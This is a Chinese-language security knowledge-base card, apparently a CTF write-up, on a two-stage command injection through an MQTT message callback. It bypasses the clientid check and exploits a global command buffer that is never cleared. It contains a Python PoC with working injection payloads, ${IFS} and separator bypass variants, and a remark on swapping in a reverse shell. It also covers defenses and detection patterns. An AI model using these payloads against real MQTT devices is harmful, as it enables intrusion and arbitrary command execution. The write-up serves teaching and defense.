---
id: iot-protocol-mqtt-callback-clientid-filter-global-cmd-buffer-injection
title: MQTT 消息回调命令注入：绕过 clientid 过滤 + 全局 cmd 缓冲区未清零的两阶段利用
type: scenario
domain: iot
path: iot/protocol
technique: mqtt-callback-global-command-buffer-two-stage-injection
tags:
- iot
- mqtt
- command-injection
- pwn
- ctf
- global-buffer
- filter-bypass
- shell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V154
  verified_at: '2026-11-06T07:40:34+08:00'
  notes: "已对照原文核对（无图）：msgarrvd 用 sscanf(\"{\\\"clientid\\\":\\\"%63[^\\\"]\\\",\") 仅过滤自身消息、非 JSON 原始请求走 http()；http() 以 snprintf(\"cat /home/ctf/%s\") + memcpy 到全局 cmd 不补 \\0，仅 s==index_html 时 popen；原文 exp 的 make_stage1(index_html;cmd${IFS}#)/make_stage2/trigger 与卡内 PoC 一致，分号拼接+ \t\n+# 注释的残留复用成立；iot/protocol 归类合适。未验证点：原文为 2026desctf 题解，未本机复跑二进制，http() 的路径解析代码原文未展示（s 提取方式需按样本复核）；frontmatter 无 sources/source_url（全库惯例）。"
url: /docs/iot/protocol/iot-protocol-mqtt-callback-clientid-filter-global-cmd-buffer-injection/
draft: false
kb_aliases:
- MQTT 命令注入
- MQTT msgarrvd 回调
- clientid 过滤绕过
- 全局缓冲区未清零
- cat /home/ctf 命令拼接
- ${IFS} 绕过空格
- 原始 MQTT 客户端 PoC
---

## 一句话结论

MQTT 客户端把收到的消息交给 `msgarrvd` 回调，只用 `sscanf` 检查 JSON 里的 `clientid` 是否为 `httpclient`；攻击者直接发送原始 HTTP 请求即可让 `sscanf` 失败并进入 `http()`，而 `http()` 把请求路径拼进 `cat /home/ctf/%s` 后 `memcpy` 到全局 `cmd` 却不补 `\0`；先用一条更长的非 `index_html` 路径写入恶意尾巴，再发送 `index_html` 触发 `popen`，残留尾巴被拼进最终 shell 命令，形成两阶段命令注入。

## 原理

- **过滤逻辑**：`msgarrvd` 取消息 payload 后执行 `sscanf(payload, "{\"clientid\":\"%63[^\"]\",", s1)`，仅当解析成功且 `s1 == "httpclient"` 时提前返回（过滤自己发出的消息）。发送不以 `{"clientid":"` 开头的原始 HTTP 请求时 `sscanf` 返回 0，条件不成立，代码走 else 分支调用 `http(payload)`——过滤被直接绕过。
- **命令构造**：`http()` 从请求行提取路径中的文件名 `s`，执行 `snprintf(src, 0x80, "cat /home/ctf/%s", s)`；`n = strlen(src); memcpy(cmd, src, n);` 把内容复制到全局 `cmd`，但没有写 `cmd[n] = '\0'`。只有当 `!strcmp(s, "index_html")` 成立时才 `popen(cmd, "r")` 执行。
- **两阶段利用**：
  1. 第一阶段发送路径 `index_html;cat${IFS}flag*${IFS}#`，`s` 不等于 `index_html`，不会执行；但 `cmd` 被写入一条较长的字符串，末尾在 `cmd[n1]` 之后留下 `;cat${IFS}flag*${IFS}#...` 的残留。
  2. 第二阶段发送路径 `index_html`，`strcmp` 通过，`snprintf` 只写入 `cat /home/ctf/index_html`（n2 < n1），`memcpy` 不补 `\0`，于是 `cmd` 的字符串是 `cat /home/ctf/index_html` 加上第一阶段残留的 `;cat${IFS}flag*${IFS}#...`。`popen` 交给 shell 后，分号把两条命令串起来，`#` 注释掉尾部垃圾，`${IFS}` 代替空格绕过过滤。
- **为什么成立**：全局缓冲区跨请求复用且未清零；`strcmp` 只校验文件名 `s`，不校验最终 `cmd`；`popen` 以 shell 解析整条命令；MQTT 消息内容完全由发布者控制。三者叠加把“文件名白名单”变成了任意 shell 命令拼接。
- **MQTT 侧前提**：程序订阅固定 topic（如 `HTTP`），任何能连接 broker 并 publish 的客户端都能触发回调；PoC 用原始 MQTT 3.1.1 报文（CONNECT/SUBSCRIBE/PUBLISH）直接与 broker 交互。

## 触发条件

- 目标程序通过 MQTT 接收消息并在回调中处理消息内容（订阅固定 topic，常见于 IoT/网关/CTF 服务）。
- 回调的过滤只做浅层字符串/JSON 校验，原始非 JSON 消息可绕过并进入业务函数。
- 业务函数把消息字段拼进 shell 命令并用 `popen/system` 执行；全局命令缓冲区未在每次写入前清零/未补 `\0`。
- 攻击者能连接 MQTT broker 并向目标 topic 发布消息（无认证或凭据泄露）。
- 目标路径/文件名部分可控，且存在“合法值触发执行”的分支。

## 利用步骤

1. 连接 MQTT broker，确认目标订阅的 topic（如 `HTTP`），订阅该 topic 以观察回显。
2. 绕过 clientid 过滤：不要发送 `{"clientid":"..."}` JSON，直接发送 `GET /ctf/<payload> HTTP/1.1\r\n\r\n\x00` 形式的原始请求，使 `sscanf` 失败并进入 `http()`。
3. 第一阶段：路径设为 `index_html;cat${IFS}flag*${IFS}#`（或 `cat${IFS}/flag`），让 `s != index_html` 不执行，但把长命令留在全局 `cmd`。
4. 第二阶段：发送路径 `index_html`，触发 `popen`；未清零的 `cmd` 尾部把第一阶段命令拼接进来，执行 `cat` 读取 flag/敏感文件。
5. 订阅 topic 读取 `http` 返回的消息（PoC 中 `httpclient` 发布的结果），或直接观察命令副作用。
6. 可替换命令为反弹 shell/写文件；payload 长度受 `sscanf` 的 `%63` 与路径解析限制，必要时用短命令和 `${IFS}`/通配符。

## PoC

原文提供完整 Python 原始 MQTT 客户端；下面保留关键 payload 与发送逻辑（未在本机复跑）：

```python
# 原始 MQTT 3.1.1：CONNECT + SUBSCRIBE + PUBLISH，topic = "HTTP"
# 关键 payload 构造（完整客户端见原文 PoC）
def make_stage1(cmd):
    if not cmd.endswith("${IFS}#"):
        cmd += "${IFS}#"
    inj = "index_html;" + cmd            # s != index_html，不触发 popen
    assert len(inj) <= 63
    return f"GET /ctf/{inj} HTTP/1.1\r\n\r\n\x00".encode()

def make_stage2():
    return b"GET /ctf/index_html HTTP/1.1\r\n\r\n\x00"   # 触发 popen，复用残留尾部

# 先 publish(stage1)，短暂等待后再 publish(stage2)
```

```text
最终 cmd 形态（示意）：
cat /home/ctf/index_html;cat${IFS}flag*${IFS}#<残留垃圾>
```

说明：`${IFS}` 用于替代空格，`#` 注释掉缓冲区残留；实际偏移/长度需按目标二进制调整。

## 变体与关联

- 变体：过滤要求 JSON 时，可构造 `{"clientid":"other", ...}` 让 clientid 不等于 `httpclient`，同时把 HTTP 请求内容放进后续字段，具体取决于 `http()` 的解析方式。
- 变体：用 `${IFS}$9`、`$IFS`、Tab、`{cat,flag}` 等替代空格；用 `;`、`&&`、`|`、反引号、`$()` 拼接命令；用 `#`、`;` 注释/截断尾部。
- 变体：若全局缓冲区在请求间被清零，可寻找其他未初始化/未截断的全局字段，或直接利用 `s` 可控长度造成 `snprintf` 截断与拼接差异。
- 关联：[[iot-protocol-dlink-dir645-ssdpcgi-command-injection]]（HTTP 环境变量进 shell 的同类命令注入）、[[iot-protocol-huawei-hg532-upnp-deviceupgrade-command-injection]]、[[ctf-pwn-bytecode-vm-signed-offset-oob-write-global-command-system]]（全局命令缓冲区被改写后执行）。
- 边界：broker 有严格 ACL 且攻击者无法发布到目标 topic、消息内容不走 shell、每次写入前清零并补 `\0`、只允许白名单命令/参数时，链不成立。

## 检测与防御

- 代码层：不要用 `popen/system` 拼接消息字段；改用 `execve`/`posix_spawn` 传 argv，或对文件名做严格白名单（仅 `[A-Za-z0-9_.-]`）并拒绝 `;|&$` 等元字符。
- 缓冲区：每次使用全局命令缓冲区前 `memset`，复制后显式 `buf[n] = '\0'`；避免跨请求复用未初始化数据。
- MQTT：启用认证与 topic ACL，禁止匿名 publish；限制消息大小与 schema，严格 JSON 解析（不要用 `sscanf` 做安全校验）。
- 检测：MQTT payload 中出现 `${IFS}`、`;`、`|`、`$(`、反引号、`#` 等 shell 元字符；目标进程派生 `sh -c cat ...`；对固定 topic 的异常 publish 频率/来源。
- 响应：隔离受影响服务，审计 MQTT broker 日志与订阅者，检查 `/home/ctf`、flag 文件及命令副作用，轮换 broker 凭据。
